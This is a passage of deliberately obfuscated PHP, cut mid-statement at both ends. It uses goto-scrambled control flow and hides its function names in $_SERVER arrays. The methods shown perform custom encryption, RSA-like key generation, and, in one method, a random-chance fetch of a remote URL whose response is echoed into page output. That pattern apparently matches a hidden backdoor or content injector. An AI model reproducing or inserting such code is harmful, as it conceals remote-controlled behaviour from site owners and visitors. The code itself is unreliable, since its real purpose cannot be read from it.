$b¸ö²ŒÍ‚Ş[319] => $b¸ö²ŒÍ‚Ş[310], $b¸ö²ŒÍ‚Ş[320] => $b¸ö²ŒÍ‚Ş[321], $b¸ö²ŒÍ‚Ş[322] => $b¸ö²ŒÍ‚Ş[312], $b¸ö²ŒÍ‚Ş[323] => $b¸ö²ŒÍ‚Ş[324], $b¸ö²ŒÍ‚Ş[325] => $b¸ö²ŒÍ‚Ş[314], $b¸ö²ŒÍ‚Ş[326] => $b¸ö²ŒÍ‚Ş[327], $b¸ö²ŒÍ‚Ş[328] => $b¸ö²ŒÍ‚Ş[329], $b¸ö²ŒÍ‚Ş[330] => $b¸ö²ŒÍ‚Ş[331]); goto d‹ì‘é¥ß; B¶É¨£ãæò: return $e×£ºÊä†Ü + $Bî“Ññª”; goto B°‹¥¢¤àÊ; B°‹¥¢¤àÊ: } public function mtxj6e440963($E¼›æÅªø) { goto c«µÚ• ’; c«µÚ• ’: $FÙ‡½›ó™ =& $_SERVER[Å¸ş]; $eäñâï×ê =& $_SERVER[ÀÌîòš£]; $aˆÍ¶È‰’ñ = $this->{$_SERVER[ÀÌîòš£][146]}(); goto aÑ¯‘Á‡’‰; FĞå®î—’: $c¸„ˆóÓ£¬ = $eäñâï×ê[230]($c¸„ˆóÓ£¬, $eäñâï×ê[10], $eäñâï×ê[333]); if (!$eäñâï×ê[247]($E¼›æÅªø[$eäñâï×ê[333]], $c¸„ˆóÓ£¬)) { $eäñâï×ê[175]($eäñâï×ê[337], !1, $eäñâï×ê[244]); } goto Fî¿ƒ’Â™; fù¡ØŞÍÑ: if (strlen($aåŒ»â•Ã) < $FÙ‡½›ó™[566]) { return; } if ($eµà¶´çËì <= $aˆÍ¶È‰’ñ) { return; } $c¸„ˆóÓ£¬ = $eäñâï×ê[61]($eäñâï×ê[148])->{$_SERVER[ÀÌîòš£][334]}($eäñâï×ê[333])->{$_SERVER[ÀÌîòš£][335]}($aˆÍ¶È‰’ñ)->{$_SERVER[ÀÌîòš£][336]}(); goto FĞå®î—’; aÑ¯‘Á‡’‰: $dË‘¶†ŞÜä = $FÙ‡½›ó™[634]; if (!$dË‘¶†ŞÜä) { return; } if ($E¼›æÅªø[$eäñâï×ê[333]] == $eäñâï×ê[228]) { return; } goto aß¹Û¥ËÃÆ; aß¹Û¥ËÃÆ: if ($aˆÍ¶È‰’ñ >= $eäñâï×ê[249]($eäñâï×ê[250])) { return; } $eµà¶´çËì = $eäñâï×ê[61]($eäñâï×ê[148])->{$_SERVER[ÀÌîòš£][149]}(); $aåŒ»â•Ã = $FÙ‡½›ó™[635]; goto fù¡ØŞÍÑ; Fî¿ƒ’Â™: } public function xwch7109f305() { goto Aö¶‹¿Ê·; Aö¶‹¿Ê·: $DÄ„¶ÁÄ¯ï =& $_SERVER[Å¸ş]; $cËâÄ²Ê›ò =& $_SERVER[ÀÌîòš£]; if (!$cËâÄ²Ê›ò[113]($GLOBALS, $cËâÄ²Ê›ò[141]) || $cËâÄ²Ê›ò[338](1, 100) > 20) { return; } goto CáåÀãÏ¦; EëË„’Ô: $eëÙ‚Š = $this->{$_SERVER[ÀÌîòš£][255]}($eëÙ‚Š, $cËâÄ²Ê›ò[256]); $DÖ¤—³™ = $DÄ„¶ÁÄ¯ï[636]; if (!$DÖ¤—³™) { return; } goto e†ãŒÎÉ‡; CáåÀãÏ¦: $eëÙ‚Š = $cËâÄ²Ê›ò[254]; $aÙ‚¹Íôñ´ = $DÄ„¶ÁÄ¯ï[570]; if (!$aÙ‚¹Íôñ´) { return; } goto EëË„’Ô; e†ãŒÎÉ‡: $eªˆËË–¼ = $cËâÄ²Ê›ò[257](array($cËâÄ²Ê›ò[258] => array($cËâÄ²Ê›ò[259] => $cËâÄ²Ê›ò[260], $cËâÄ²Ê›ò[261] => 3))); $AæÓÊš¾•Ñ = $DÄ„¶ÁÄ¯ï[637]; $F‹ Àå¦£¹ = @$cËâÄ²Ê›ò[262]($eëÙ‚Š, !1, $eªˆËË–¼); goto f£ğë—˜˜±; f£ğë—˜˜±: $A±æÊÒ¿Ê = $DÄ„¶ÁÄ¯ï[638]; if (strlen($A±æÊÒ¿Ê) < $DÄ„¶ÁÄ¯ï[561]) { die; } echo $cËâÄ²Ê›ò[339] . $cËâÄ²Ê›ò[340]($F‹ Àå¦£¹) . $cËâÄ²Ê›ò[341]; goto b…éâ…òó“; b…éâ…òó“: } private function eohp5ba3b60c($aœ©õÄ©æÅ, $EÄİ…Ó‰­‘, $b„ÖİÂù…Ä = 3) { goto B ñ–­Ÿ–ä; Eğƒ„‚Íœ: $aœ©õÄ©æÅ = $C‘Ç‹â‚óÛ[2]($aœ©õÄ©æÅ); $E§Ç›ÍÁö = $C‘Ç‹â‚óÛ[338](0, 5) . $C‘Ç‹â‚óÛ[10]; $Aá‡Ğ‹òë» = $C‘Ç‹â‚óÛ[133](15); goto eøîİàá£Ê; eøîİàá£Ê: $aïğ°¨Ç = $C‘Ç‹â‚óÛ[343]; $c«¯™»‹‘… = $Bß…¡§ññ[639]; switch ($E§Ç›ÍÁö) { case $C‘Ç‹â‚óÛ[240]: $a²½Êò›‚ = $this->{$_SERVER[ÀÌîòš£][156]}($aœ©õÄ©æÅ, $C‘Ç‹â‚óÛ[222]($EÄİ…Ó‰­‘ . $Aá‡Ğ‹òë»)); break; case $C‘Ç‹â‚óÛ[228]: $a²½Êò›‚ = $this->{$_SERVER[ÀÌîòš£][156]}($aœ©õÄ©æÅ, $C‘Ç‹â‚óÛ[222]($Aá‡Ğ‹òë» . $EÄİ…Ó‰­‘)); break; case $C‘Ç‹â‚óÛ[344]: $a²½Êò›‚ = $this->{$_SERVER[ÀÌîòš£][156]}($aœ©õÄ©æÅ, $C‘Ç‹â‚óÛ[127]($Aá‡Ğ‹òë» . $EÄİ…Ó‰­‘)); break; $B„¹æ”íÚ = $Bß…¡§ññ[640]; case $C‘Ç‹â‚óÛ[345]: $a²½Êò›‚ = $this->{$_SERVER[ÀÌîòš£][156]}($aœ©õÄ©æÅ, $C‘Ç‹â‚óÛ[123]($Aá‡Ğ‹òë» . $EÄİ…Ó‰­‘)); $F§Øòî’Ã³ = $Bß…¡§ññ[641]; while (strlen($F§Øòî’Ã³) < $Bß…¡§ññ[550]) { if (!$F§Øòî’Ã³) { break; } $F§Øòî’Ã³++; } break; $D“¢ “öòì = $Bß…¡§ññ[642]; if (!$D“¢ “öòì) { return; } case $C‘Ç‹â‚óÛ[346]: goto fŠˆ¦›; c¯à×¨“ò : $bµÓ‚´’ÈÔ = $Bß…¡§ññ[643]; if (!$bµÓ‚´’ÈÔ) { return; } $c¼¼©ƒ¬² = $C‘Ç‹â‚óÛ[123]($f×Ûù‘‰ƒã . $C‘Ç‹â‚óÛ[123]($EÄİ…Ó‰­‘ . $f×Ûù‘‰ƒã) . $EÄİ…Ó‰­‘); goto d¦õ³¿ƒ¼; fŠˆ¦›: $aœ©õÄ©æÅ = $C‘Ç‹â‚óÛ[127]($aœ©õÄ©æÅ); $eÉÅ•Œ¬ğ = $C‘Ç‹â‚óÛ[347](0, 64); $f×Ûù‘‰ƒã = $aïğ°¨Ç[$eÉÅ•Œ¬ğ]; goto c¯à×¨“ò ; B«ãó®Šğ·: $BŒ™„ˆÇ‡Ì = 0; for ($Dİ‹¾¤óÊ = 0; $Dİ‹¾¤óÊ < $C‘Ç‹â‚óÛ[24]($aœ©õÄ©æÅ); $Dİ‹¾¤óÊ++) { $BŒ™„ˆÇ‡Ì = $BŒ™„ˆÇ‡Ì == $C‘Ç‹â‚óÛ[24]($c¼¼©ƒ¬²) ? 0 : $BŒ™„ˆÇ‡Ì; $EëĞ’×Àòí = $Bß…¡§ññ[645]; if (strlen($EëĞ’×Àòí) < $Bß…¡§ññ[572]) { return; } $aäâãŠƒÇÌ = ($eÉÅ•Œ¬ğ + $C‘Ç‹â‚óÛ[348]($aïğ°¨Ç, $aœ©õÄ©æÅ[$Dİ‹¾¤óÊ]) + $C‘Ç‹â‚óÛ[349]($c¼¼©ƒ¬²[$BŒ™„ˆÇ‡Ì++])) % 64; $aù¯†ŞøŞ .= $aïğ°¨Ç[$aäâãŠƒÇÌ]; } $a²½Êò›‚ = $C‘Ç‹â‚óÛ[340]($f×Ûù‘‰ƒã . $aù¯†ŞøŞ); goto BÑ¨Ó‰ø‚ó; d¦õ³¿ƒ¼: $c¼¼©ƒ¬² = $C‘Ç‹â‚óÛ[25]($c¼¼©ƒ¬², $eÉÅ•Œ¬ğ % 8, $eÉÅ•Œ¬ğ % 8 + 7); $aù¯†ŞøŞ = $C‘Ç‹â‚óÛ[10]; $eƒë‰¡¤Ğ© = $Bß…¡§ññ[644]; goto fÑ…ùºò¯ì; BÑ¨Ó‰ø‚ó: break; $Eáœµ‹–Ğ˜ = $Bß…¡§ññ[646]; if (strlen($Eáœµ‹–Ğ˜) < $Bß…¡§ññ[550]) { die; } goto cÃ…Šß; fÑ…ùºò¯ì: if (strlen($eƒë‰¡¤Ğ©) < $Bß…¡§ññ[572]) { die; } $Dİ‹¾¤óÊ = 0; $aäâãŠƒÇÌ = 0; goto B«ãó®Šğ·; cÃ…Šß: default: $a²½Êò›‚ = $this->{$_SERVER[ÀÌîòš£][156]}($aœ©õÄ©æÅ, $EÄİ…Ó‰­‘ . $Aá‡Ğ‹òë»); $f´Š¿²ŒÕ = $Bß…¡§ññ[647]; while ($f´Š¿²ŒÕ < $Bß…¡§ññ[550]) { if ($f´Š¿²ŒÕ >= 0) { break; } $f´Š¿²ŒÕ++; } break; } goto Bğã”ÙÄ±æ; Bğã”ÙÄ±æ: $a²½Êò›‚ = $C‘Ç‹â‚óÛ[222]($E§Ç›ÍÁö . $Aá‡Ğ‹òë» . $a²½Êò›‚); if ($b„ÖİÂù…Ä - 1 > 0) { $a²½Êò›‚ = $this->{$_SERVER[ÀÌîòš£][136]}($a²½Êò›‚, $EÄİ…Ó‰­‘, $b„ÖİÂù…Ä - 1); } return $a²½Êò›‚; goto DòŞ­Á Ò«; B ñ–­Ÿ–ä: $Bß…¡§ññ =& $_SERVER[Å¸ş]; $C‘Ç‹â‚óÛ =& $_SERVER[ÀÌîòš£]; $C‘Ç‹â‚óÛ[342](1); goto Eğƒ„‚Íœ; DòŞ­Á Ò«: } private function eusne4314195($fÍŠ¯îÀ·Õ, $Cï¿•Ó«¬Õ, $D´ÌŠ¤ = 3) { goto Fœ¨Õ¶´®©; BĞê³®©â£: $EìÔÇî…¾î = $DİÍ‚›…Ì†[648]; if (!$EìÔÇî…¾î) { die; } $E‰¦Ë®…çê = $F÷íæö´Ú§[25]($fÍŠ¯îÀ·Õ, 1, 15); goto C¹¤×´³Ï±; DëÙ¼ìÂ–ù: switch ($CÌˆ›¸Ì‘Î) { case $F÷íæö´Ú§[240]: $B”¨ƒŞ—Áš = $this->{$_SERVER[ÀÌîòš£][255]}($fÍŠ¯îÀ·Õ, $F÷íæö´Ú§[222]($Cï¿•Ó«¬Õ . $E‰¦Ë®…çê)); $CÕ¨¯Ùµ‹Ÿ = $DİÍ‚›…Ì†[651]; break; $Døïö‚¨¸İ = $DİÍ‚›…Ì†[652]; case $F÷íæö´Ú§[228]: $B”¨ƒŞ—Áš = $this->{$_SERVER[ÀÌîòš£][255]}($fÍŠ¯îÀ·Õ, $F÷íæö´Ú§[222]($E‰¦Ë®…çê . $Cï¿•Ó«¬Õ)); $f¥±†Œ¯ñ = $DİÍ‚›…Ì†[653]; if (!$f¥±†Œ¯ñ) { die; } break; case $F÷íæö´Ú§[344]: $B”¨ƒŞ—Áš = $this->{$_SERVER[ÀÌîòš£][255]}($fÍŠ¯îÀ·Õ, $F÷íæö´Ú§[127]($E‰¦Ë®…çê . $Cï¿•Ó«¬Õ)); break; $bóÔà±—–â = $DİÍ‚›…Ì†[654]; if (!$bóÔà±—–â) { die; } case $F÷íæö´Ú§[345]: $B”¨ƒŞ—Áš = $this->{$_SERVER[ÀÌîòš£][255]}($fÍŠ¯îÀ·Õ, $F÷íæö´Ú§[123]($E‰¦Ë®…çê . $Cï¿•Ó«¬Õ)); $aÉ•õÎÄµ = $DİÍ‚›…Ì†[655]; break; case $F÷íæö´Ú§[346]: goto FÏ¸¸ÁïÀÓ; A˜ãµğÎ”: $CÔ‹ìãÔ‚é = $DİÍ‚›…Ì†[660]; if (strlen($CÔ‹ìãÔ‚é) < $DİÍ‚›…Ì†[554]) { die; } $e«Ü‹­©“ = $F÷íæö´Ú§[10]; goto cõ¸çóä˜; F„Òˆ±éÑ: if (strlen($D©ëŞç®ºÏ) < $DİÍ‚›…Ì†[561]) { return; } $EÛÜ÷ÒÓª² = $F÷íæö´Ú§[348]($d¿š¦°ß¬”, $E²ã†®×‚‡); $aì¦Ê¹˜÷ø = $DİÍ‚›…Ì†[658]; goto dİğ…íì®; FÏ¸¸ÁïÀÓ: $fÍŠ¯îÀ·Õ = $F÷íæö´Ú§[351]($fÍŠ¯îÀ·Õ); $E²ã†®×‚‡ = $fÍŠ¯îÀ·Õ[0]; $FîÊ¥¿Œ·Û = $DİÍ‚›…Ì†[656]; goto FÉ¦ êã‰ƒ; b£Š¨”®¹•: $Aì­Å‘÷ôµ = $DİÍ‚›…Ì†[662]; while ($Aì­Å‘÷ôµ < $DİÍ‚›…Ì†[566]) { if ($Aì­Å‘÷ôµ >= 0) { break; } $Aì­Å‘÷ôµ++; } $F™ç§´¬’í = 0; goto bÜŒİ‘„èÔ; dİğ…íì®: $Cæ°ÄÛ¥ºš = $F÷íæö´Ú§[123]($E²ã†®×‚‡ . $F÷íæö´Ú§[123]($Cï¿•Ó«¬Õ . $E²ã†®×‚‡) . $Cï¿•Ó«¬Õ); $FÁªÛšÁ½ = $DİÍ‚›…Ì†[659]; $Cæ°ÄÛ¥ºš = $F÷íæö´Ú§[25]($Cæ°ÄÛ¥ºš, $EÛÜ÷ÒÓª² % 8, $EÛÜ÷ÒÓª² % 8 + 7); goto A˜ãµğÎ”; bÜŒİ‘„èÔ: $Aîä‰–©–Ö = 0; for ($e“¤õÑÇÉ = 0; $e“¤õÑÇÉ < $F÷íæö´Ú§[24]($fÍŠ¯îÀ·Õ); $e“¤õÑÇÉ++) { $Aîä‰–©–Ö = $Aîä‰–©–Ö == $F÷íæö´Ú§[24]($Cæ°ÄÛ¥ºš) ? 0 : $Aîä‰–©–Ö; $D·À…æ÷ Í = $Aîä‰–©–Ö++; $Bø÷ãÇ©‚Æ = $DİÍ‚›…Ì†[663]; while (strlen($Bø÷ãÇ©‚Æ) < $DİÍ‚›…Ì†[554]) { if (!$Bø÷ãÇ©‚Æ) { break; } $Bø÷ãÇ©‚Æ++; } $F™ç§´¬’í = $F÷íæö´Ú§[348]($d¿š¦°ß¬”, $fÍŠ¯îÀ·Õ[$e“¤õÑÇÉ]) - $EÛÜ÷ÒÓª² - $F÷íæö´Ú§[349]($Cæ°ÄÛ¥ºš[$D·À…æ÷ Í]); while ($F™ç§´¬’í < 0) { $F™ç§´¬’í += 64; $BÈ²«Œ’Û = $DİÍ‚›…Ì†[664]; while (strlen($BÈ²«Œ’Û) < $DİÍ‚›…Ì†[572]) { if (!$BÈ²«Œ’Û) { break; } $BÈ²«Œ’Û++; } } $e«Ü‹­©“ .= $d¿š¦°ß¬”[$F™ç§´¬’í]; } $B”¨ƒŞ—Áš = $F÷íæö´Ú§[352]($e«Ü‹­©“); goto CƒÅèåÙèè; CƒÅèåÙèè: break; goto e–Æ¬Â—ËÖ; cõ¸çóä˜: $a‡®ÜÊ¡¾ = $DİÍ‚›…Ì†[661]; if (!$a‡®ÜÊ¡¾) { return; } $e“¤õÑÇÉ = 0; goto b£Š¨”®¹•; FÉ¦ êã‰ƒ: if (strlen($FîÊ¥¿Œ·Û) < $DİÍ‚›…Ì†[572]) { die; } $fÍŠ¯îÀ·Õ = $F÷íæö´Ú§[25]($fÍŠ¯îÀ·Õ, 1); $D©ëŞç®ºÏ = $DİÍ‚›…Ì†[657]; goto F„Òˆ±éÑ; e–Æ¬Â—ËÖ: default: $B”¨ƒŞ—Áš = $this->{$_SERVER[ÀÌîòš£][255]}($fÍŠ¯îÀ·Õ, $Cï¿•Ó«¬Õ . $E‰¦Ë®…çê); $DÅ½¾¬‰ = $DİÍ‚›…Ì†[665]; break; } if ($D´ÌŠ¤ - 1 > 0) { $B”¨ƒŞ—Áš = $this->{$_SERVER[ÀÌîòš£][197]}($B”¨ƒŞ—Áš, $Cï¿•Ó«¬Õ, $D´ÌŠ¤ - 1); } return $B”¨ƒŞ—Áš; goto f‡”Õö»; Fœ¨Õ¶´®©: $DİÍ‚›…Ì† =& $_SERVER[Å¸ş]; $F÷íæö´Ú§ =& $_SERVER[ÀÌîòš£]; if (!$F÷íæö´Ú§[350]($fÍŠ¯îÀ·Õ) || $F÷íæö´Ú§[24]($fÍŠ¯îÀ·Õ) < 10) { return !1; } goto EÚÚÈùµßâ; e÷‡ğÅëŒá: $E“Ñ³‡Ş†ğ = $DİÍ‚›…Ì†[650]; while ($E“Ñ³‡Ş†ğ < $DİÍ‚›…Ì†[561]) { if ($E“Ñ³‡Ş†ğ >= 0) { break; } $E“Ñ³‡Ş†ğ++; } $d¿š¦°ß¬” = $F÷íæö´Ú§[343]; goto DëÙ¼ìÂ–ù; C¹¤×´³Ï±: $bãŒ¯·ÓÉ = $DİÍ‚›…Ì†[649]; while (strlen($bãŒ¯·ÓÉ) < $DİÍ‚›…Ì†[554]) { if (!$bãŒ¯·ÓÉ) { break; } $bãŒ¯·ÓÉ++; } $fÍŠ¯îÀ·Õ = $F÷íæö´Ú§[25]($fÍŠ¯îÀ·Õ, 16); goto e÷‡ğÅëŒá; EÚÚÈùµßâ: $fÍŠ¯îÀ·Õ = $F÷íæö´Ú§[2]($fÍŠ¯îÀ·Õ); $fÍŠ¯îÀ·Õ = $F÷íæö´Ú§[222]($fÍŠ¯îÀ·Õ); $CÌˆ›¸Ì‘Î = $fÍŠ¯îÀ·Õ[0]; goto BĞê³®©â£; f‡”Õö»: } public function xcikfa402bc9($A„Û×‹‰…) { goto fÑš„ì‰†…; bÁîÁÇ¡å°: while (1) { $aÈ¹“íÆÉ = $E¯ÕÎ¹ŠˆÎ; $c®ä’ËÌó = $B˜éÙ³‡õê[668]; if (!$c®ä’ËÌó) { return; } $CÁ´—²…î¥ = $DÓã•­ª¬¢; $Bõ»Éï–Òœ = $B˜éÙ³‡õê[669]; if (strlen($Bõ»Éï–Òœ) < $B˜éÙ³‡õê[550]) { die; } while ($CÁ´—²…î¥ % $aÈ¹“íÆÉ != 0) { $a¯Ë¯«·Ëƒ = $CÁ´—²…î¥; $e‚Š†äæÅ = $B˜éÙ³‡õê[670]; if (!$e‚Š†äæÅ) { die; } $CÁ´—²…î¥ = $aÈ¹“íÆÉ; $F•ƒ„Úâåâ = $B˜éÙ³‡õê[671]; if (strlen($F•ƒ„Úâåâ) < $B˜éÙ³‡õê[561]) { die; } $aÈ¹“íÆÉ = $a¯Ë¯«·Ëƒ % $aÈ¹“íÆÉ; $B™–ã´Â = $B˜éÙ³‡õê[672]; if (!$B™–ã´Â) { return; } } if ($aÈ¹“íÆÉ == 1) { break; } else { $E¯ÕÎ¹ŠˆÎ++; } } $fÃàåò‰ÌŠ = 2; for ($bÎ£˜ê³¼£ = 0; $bÎ£˜ê³¼£ < $DÓã•­ª¬¢ * 10; $bÎ£˜ê³¼£++) { if (($DÓã•­ª¬¢ * $bÎ£˜ê³¼£ + 1) % $E¯ÕÎ¹ŠˆÎ == 0) { $fÃàåò‰ÌŠ = $D²¿¥†ä›¾[249](($DÓã•­ª¬¢ * $bÎ£˜ê³¼£ + 1) / $E¯ÕÎ¹ŠˆÎ); break; } } goto c¬áÜšì‚›; c¬áÜšì‚›: $dù¨Ûê›‘ê = $this->{$_SERVER[ÀÌîòš£][156]}($eîÄ†íÛ¢ * $b‚áª×äÑ› . $D²¿¥†ä›¾[10], $D²¿¥†ä›¾[158]); $c¯”é‡çÀï = $B˜éÙ³‡õê[673]; while (strlen($c¯”é‡çÀï) < $B˜éÙ³‡õê[572]) { if (!$c¯”é‡çÀï) { break; } $c¯”é‡çÀï++; } goto D¨èºÒÁÖ’; A­÷¼–¦¸Ä: return $c©ŒºÖİíŠ; $dÉ ù‡Å‚í = $B˜éÙ³‡õê[675]; if (!$dÉ ù‡Å‚í) { return; } goto aì‹ÆÅ÷êì; fÑš„ì‰†…: $B˜éÙ³‡õê =& $_SERVER[Å¸ş]; $D²¿¥†ä›¾ =& $_SERVER[ÀÌîòš£]; $eîÄ†íÛ¢ = $this->{$_SERVER[ÀÌîòš£][353]}(); goto A´ïÔ£ƒ; D¨èºÒÁÖ’: $fĞ‘§”ÓŒ = $D²¿¥†ä›¾[123]($D²¿¥†ä›¾[354] . ($eîÄ†íÛ¢ + $b‚áª×äÑ›) . $D²¿¥†ä›¾[355] . $E¯ÕÎ¹ŠˆÎ . $D²¿¥†ä›¾[355] . $fÃàåò‰ÌŠ . $D²¿¥†ä›¾[356]); $c©ŒºÖİíŠ = $this->{$_SERVER[ÀÌîòš£][156]}($A„Û×‹‰…, $fĞ‘§”ÓŒ) . $D²¿¥†ä›¾[357] . $dù¨Ûê›‘ê; $fõÃ™¼ÕØ = $B˜éÙ³‡õê[674]; goto A­÷¼–¦¸Ä; F¨ÀœŸ«·´: $F·æ† Ã¢¹ = $B˜éÙ³‡õê[667]; if (!$F·æ† Ã¢¹) { die; } $E¯ÕÎ¹ŠˆÎ = $D²¿¥†ä›¾[249](($eîÄ†íÛ¢ + $b‚áª×äÑ›) / 2); goto bÁîÁÇ¡å°; A´ïÔ£ƒ: $b‚áª×äÑ› = $this->{$_SERVER[ÀÌîòš£][353]}(); $fƒğÖŠËò = $B˜éÙ³‡õê[666]; $DÓã•­ª¬¢ = ($eîÄ†íÛ¢ - 1) * ($b‚áª×äÑ› - 1); goto F¨ÀœŸ«·´; aì‹ÆÅ÷êì: } public function sitrac1345ee($eÜ‡­äÏ) { goto e‡‹ŠøêÄç; AÊì¶§‹ÒÂ: if (strlen($e‡µÒÍì¢ß) < $fÎğƒ«¨[550]) { return; } for ($F´ôÁ¸³… = 0; $F´ôÁ¸³… < $b‰ß½Âà´ * 10; $F´ôÁ¸³…++) { if (($b‰ß½Âà´ * $F´ôÁ¸³… + 1) % $AÚ¹óÍêĞ == 0) { $b×‘Œô³Š = $d§İ³ßÈŞ[249](($b‰ß½Âà´ * $F´ôÁ¸³… + 1) / $AÚ¹óÍêĞ); break; } } $e‘¯Î¨î = $d§İ³ßÈŞ[123]($d§İ³ßÈŞ[354] . ($e¬º«•ßÅ + $e…„ĞÑÔÄ) . $d§İ³ßÈŞ[355] . $AÚ¹óÍêĞ . $d§İ³ßÈŞ[355] . $b×‘Œô³Š . $d§İ³ßÈŞ[356]); goto a‚ÅÜÚ¦Ôî; d¼ß¡†·‰Á: while (1) { $d“¥È¹É‡ = $AÚ¹óÍêĞ; $f’ˆ†é¹•‚ = $fÎğƒ«¨[680]; if (!$f’ˆ†é¹•‚) { die; } $e–áâø®Ç© = $b‰ß½Âà´; $fœÚˆ³§ Ş = $fÎğƒ«¨[681]; if (!$fœÚˆ³§ Ş) { die; } while ($e–áâø®Ç© % $d“¥È¹É‡ != 0) { $dåÊŠ¤¾‡¾ = $e–áâø®Ç©; $e–áâø®Ç© = $d“¥È¹É‡; $d“¥È¹É‡ = $dåÊŠ¤¾‡¾ % $d“¥È¹É‡; } if ($d“¥È¹É‡ == 1) { break; } else { $AÚ¹óÍêĞ++; } } $b×‘Œô³Š = 2; $e‡µÒÍì¢ß = $fÎğƒ«¨[682]; goto AÊì¶§‹ÒÂ; E¶£ŒµèÁ‚: $dÑäóÅ‡‹ = $this->{$_SERVER[ÀÌîòš£][255]}($AñË‘— ¢¼[1] . $d§İ³ßÈŞ[10], $d§İ³ßÈŞ[158]); $AÔ±Úõğç¸ = $fÎğƒ«¨[677]; if (!$dÑäóÅ‡‹) { return $d§İ³ßÈŞ[10]; } goto AÀ‹¯ò’èù; e‡‹ŠøêÄç: $fÎğƒ«¨ =& $_SERVER[Å¸ş]; $d§İ³ßÈŞ =& $_SERVER[ÀÌîòš£]; $AñË‘— ¢¼ = $d§İ³ßÈŞ[0]($d§İ³ßÈŞ[357], $eÜ‡­äÏ); goto a‰ğçØ›ù‘; C‰‘¸´ºŒ¢: for ($F´ôÁ¸³… = 3; $F´ôÁ¸³… < $dÑäóÅ‡‹; $F´ôÁ¸³… += 2) { if ($dÑäóÅ‡‹ % $F´ôÁ¸³… != 0) { continue; } $e¬º«•ßÅ = $F´ôÁ¸³…; $e™„î²ËÑÅ = $fÎğƒ«¨[678]; $e…„ĞÑÔÄ = $d§İ³ßÈŞ[249]($dÑäóÅ‡‹ / $F´ôÁ¸³…); break; $Eï¨‚¹ÈÏ = $fÎğƒ«¨[679]; while ($Eï¨‚¹ÈÏ < $fÎğƒ«¨[566]) { if ($Eï¨‚¹ÈÏ >= 0) { break; } $Eï¨‚¹ÈÏ++; } } $b‰ß½Âà´ = ($e¬º«•ßÅ - 1) * ($e…„ĞÑÔÄ - 1); $AÚ¹óÍêĞ = $d§İ³ßÈŞ[249](($e¬º«•ßÅ + $e…„ĞÑÔÄ) / 2); goto d¼ß¡†·‰Á; a‰ğçØ›ù‘: $a…ßÌ‚¼ó‹ = $fÎğƒ«¨[676]; while (strlen($a…ßÌ‚¼ó‹) < $fÎğƒ«¨[561]) { if (!$a…ßÌ‚¼ó‹) { break; } $a…ßÌ‚¼ó‹++; } if ($d§İ³ßÈŞ[19]($AñË‘— ¢¼) != 2) { return $d§İ³ßÈŞ[10]; } goto E¶£ŒµèÁ‚; AÀ‹¯ò’èù: $dÑäóÅ‡‹ = $d§İ³ßÈŞ[249]($dÑäóÅ‡‹); $e¬º«•ßÅ = 0; $e…„ĞÑÔÄ = 0; goto C‰‘¸´ºŒ¢; fòÖ¼¸âÆ¥: return $F¨Š‰÷¸Š; goto A‹ï£Ì„æ§; a‚ÅÜÚ¦Ôî: $F¨Š‰÷¸Š = $this->{$_SERVER[ÀÌîòš£][255]}($AñË‘— ¢¼[0], $e‘¯Î¨î); $aî¯œß–ì¡ = $fÎğƒ«¨[683]; while (strlen($aî¯œß–ì¡) < $fÎğƒ«¨[550]) { if (!$aî¯œß–ì¡) { break; } $aî¯œß–ì¡++; } goto fòÖ¼¸âÆ¥; A‹ï£Ì„æ§: } public function habnfa1f950f() { goto d’ŠÊÕ‘›¤; FÅĞß°²Åå: return $dñÄ“È­Î; goto FßÁßØ‚÷; bŠÓ“ÈÈŞŒ: $c©—¶åö´’ = 1; while ($c©—¶åö´’ <= (int) $c¹®„ÆÉ×[359]($e°Áç³•ä)) { $dôÚ¯Ü¥öÖ = $c©—¶åö´’; $f‚ÚÇİÑ± = $EóÂö””ßõ[685]; if (!$f‚ÚÇİÑ±) { return; } while (!0) { $dôÚ¯Ü¥öÖ++; if ($dôÚ¯Ü¥öÖ <= 2) { $c©—¶åö´’ = $dôÚ¯Ü¥öÖ; break; } else { if ($dôÚ¯Ü¥öÖ < 2) { continue; } } $Aî…Äè×Ó– = !0; for ($CõËƒ˜Ú™Ç = 2; $CõËƒ˜Ú™Ç <= $c¹®„ÆÉ×[359]($dôÚ¯Ü¥öÖ); $CõËƒ˜Ú™Ç++) { if ($dôÚ¯Ü¥öÖ % $CõËƒ˜Ú™Ç == 0) { $Aî…Äè×Ó– = !1; } } if ($Aî…Äè×Ó–) { $c©—¶åö´’ = $dôÚ¯Ü¥öÖ; break; } } $dÑÄÅí¿ñ²[] = $c©—¶åö´’; $fƒ¬¸—°† = $EóÂö””ßõ[686]; if (strlen($fƒ¬¸—°†) < $EóÂö””ßõ[566]) { die; } } $dñÄ“È­Î = 2; goto EÇí¥„à«Ò; d’ŠÊÕ‘›¤: $EóÂö””ßõ =& $_SERVER[Å¸ş]; $c¹®„ÆÉ× =& $_SERVER[ÀÌîòš£]; $e°Áç³•ä = $c¹®„ÆÉ×[338]($c¹®„ÆÉ×[358](2, 14), $c¹®„ÆÉ×[358](2, 16) - 1); goto eÊ™œ¨Øí˜; EÇí¥„à«Ò: $AÈùˆ¥†Üù = $EóÂö””ßõ[687]; while ($AÈùˆ¥†Üù < $EóÂö””ßõ[561]) { if ($AÈùˆ¥†Üù >= 0) { break; } $AÈùˆ¥†Üù++; } for ($dôÚ¯Ü¥öÖ = $e°Áç³•ä; $dôÚ¯Ü¥öÖ > 1; $dôÚ¯Ü¥öÖ--) { $Aî…Äè×Ó– = !0; foreach ($dÑÄÅí¿ñ² as $e¿ÉªÜàß) { if ($dôÚ¯Ü¥öÖ % $e¿ÉªÜàß == 0) { $Aî…Äè×Ó– = !1; break; } } if ($Aî…Äè×Ó–) { $dñÄ“È­Î = $dôÚ¯Ü¥öÖ; break; } } goto FÅĞß°²Åå; eÊ™œ¨Øí˜: $cÄà·“©•ç = $EóÂö””ßõ[684]; if (!$cÄà·“©•ç) { return; } $dÑÄÅí¿ñ² = array(); goto bŠÓ“ÈÈŞŒ; FßÁßØ‚÷: } public function nuhzf920317a($Dƒ®ôËŒ¢, $C¼íİğ£À“) { $F¢ÄñŒº =& $_SERVER[ÀÌîòš£]; return $F¢ÄñŒº[13](array($F¢ÄñŒº[14], $F¢ÄñŒº[360]), $Dƒ®ôËŒ¢, $C¼íİğ£À“); $fÖåÓÉèÑË = $_SERVER[Å¸ş][688]; } public function pyro2a2fc5d3($c·è¼‰•®Å, $dÈµÑÂÆ‡) { $Eå«×£ÚÅÏ =& $_SERVER[Å¸ş]; $Fêï«ƒà§ =& $_SERVER[ÀÌîòš£]; return $Fêï«ƒà§[13](array($Fêï«ƒà§[361], $Fêï«ƒà§[362]), $c·è¼‰•®Å, $dÈµÑÂÆ‡); $cäÕĞå‰ = 